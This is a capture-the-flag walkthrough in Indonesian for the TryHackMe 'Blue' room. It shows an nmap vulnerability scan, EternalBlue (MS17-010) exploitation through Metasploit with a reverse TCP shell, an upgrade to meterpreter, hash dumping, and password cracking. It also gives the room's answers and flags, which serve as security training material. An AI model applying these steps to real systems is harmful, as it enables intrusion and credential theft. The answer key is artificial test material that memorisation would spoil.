# CTF Blue
- TryHackMe Room: https://tryhackme.com/room/blue
- IP Machine: 10.10.88.234
- Virtual machine pada path ini juga bisa di download di https://darkstar7471.com/resources.html

## Task 1 - Recon 
- Lakukan scanning dengan tool nmap menggunakan perintah: `nmap -sV --script vuln <IP Machine>`

```sh
┌──(root㉿kali)-[/home/kali]
└─# nmap -sV --script vuln 10.10.88.234 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 02:38 EDT
Nmap scan report for 10.10.88.234
Host is up (0.20s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.80 seconds
```

- **Pertanyaan:** How many ports are open with a port number under 1000?
```sh
3
```

- **Pertanyaan:** What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
```sh
ms17-010
```

## Task 2 Gain Access
- Buka `msfconsole` di terminal

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%201.JPG)

- Cari modul untuk melakukan exploit jenis kerentanan ms17–010 dengan perintah `search ms17–010`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%202.JPG)

- Disini kita menggunakan modul **exploit/windows/smb/ms17_010_eternalblue** sesuai dengan topik pada path ini yaitu **eternal blue** yang ada di list nomor 0. Jadi cukup gunakan perintah `use 0`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%203.JPG)

- Ketik `show options` untuk melihat daftar parameter yang perlu diisi pada modul tersebut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%204.JPG)

- Gunakan perintah `set <Nama parameter> <Value>` untuk mengisi parameter. Isi parameter RHOSTS dengan IP Machnine dan isi parameter LHOST dengan IP tun0 pada komputer yang anda gunakan. Kemudian setting payload `set payload windows/x64/shell/reverse_tcp` sesuai arahan tugas

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%205.JPG)

- Ketik `exploit` untuk memulai proses exploitasi

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%206.JPG)

- Proses exploitasi berhasil dan kita masuk sebagai **nt authority\system**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%207.JPG)

- **Pertanyaan:** Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
```sh
exploit/windows/smb/ms17_010_eternalblue
```

- **Pertanyaan:** Show options and set the one required value. What is the name of this value? (All caps for submission)
```sh
RHOSTS
```

## Task 3 Escalate
- Tekan **Ctrl+Z** lalu ketik "y" untuk mengubah session 1 ke background

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%208.JPG)

- Cari modul untuk mengkonversi shell sistem ke shell meterpreter di metasploit. Kita bisa gunakan perintah `search shell_to_meterpreter`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%209.JPG)

- Karena hanya ada 1 modul, langsung kita gunakan modul tersebut dengan perintah `use 0`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2010.JPG)

- Ketik `show options` untuk melihat daftar parameter yang perlu diisi pada modul tersebut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2011.JPG)

- Gunakan perintah `set <Nama parameter> <Value>` untuk mengisi parameter. Isi parameter LHOST dengan IP tun0 pada komputer yang anda gunakan dan parameter SESSION dengan 1

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2012.JPG)

- Ketik `exploit` untuk memulai proses exploitasi. Proses exploitasi berhasil dan ketikkan `sessions` untuk melihat daftar session yang berhasil terbentuk

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2013.JPG)

- Masuk ke session 2 dengan perintah `sessions -i <nomor session>`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2014.JPG)

- Ketik `ps` untuk melihat daftar proses yang berjalan di server sesuai arahan tugas. Disini ditemukan program services.exe yang berjalan di PID 672

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2015.JPG)

- Lakukan migrate dengan services.exe. Gunakan perintah `migrate <PID>`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2016.JPG)

- **Pertanyaan:** If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
```sh
post/multi/manage/shell_to_meterpreter
```

- **Pertanyaan:** Select this (use MODULE_PATH). Show options, what option are we required to change?
```sh
SESSION
```

## Task 4 Cracking
- Ketik `hashdump` maka akan diperoleh daftar user beserta passwordnya yang di hash. Disini ditemukan 1 user non default yaitu **Jon**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2017.JPG)

- Simpan hash user Jon kedalam sebuah file di local untuk melakukan cracking dengan perintah `echo hash > nama_file`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2018.JPG)

- Lakukan cracking dengan tool john the ripper `john --wordlist=/usr/share/wordlists/rockyou.txt nama_file`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2019.JPG)

- **Pertanyaan:** Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
```sh
Jon
```

- **Pertanyaan:** Copy this password hash to a file and research how to crack it. What is the cracked password?
```sh
alqfna22
```

## Task 5 Find Flags!
- Jika kita ketik `pwd` di meterpreter kita berada di directory C:\Windows\system32 

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2020.JPG)

- Navigasi ke directory C: dengan perintah `cd ../../` maka disana ditemukan file **flag1.txt**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2021.JPG)

- Buka file **flag1.txt** dengan perintah `cat nama_file`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2022.JPG)

- Cari lokasi file **flag2.txt** dan **flag3.txt** dengan perintah `search -f flag*.txt`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2023.JPG)

- Buka masing-masing file **flag2.txt** dan **flag3.txt** yang sudah ditemukan

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2024.JPG)
![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2025.JPG)

- **Pertanyaan:** Flag1? This flag can be found at the system root.  
```sh
flag{access_the_machine}
```

- **Pertanyaan:** Flag2? This flag can be found at the location where passwords are stored within Windows.
```sh
flag{sam_database_elevated_access}
```

- **Pertanyaan:** flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.  
```sh
flag{admin_documents_can_be_valuable}
```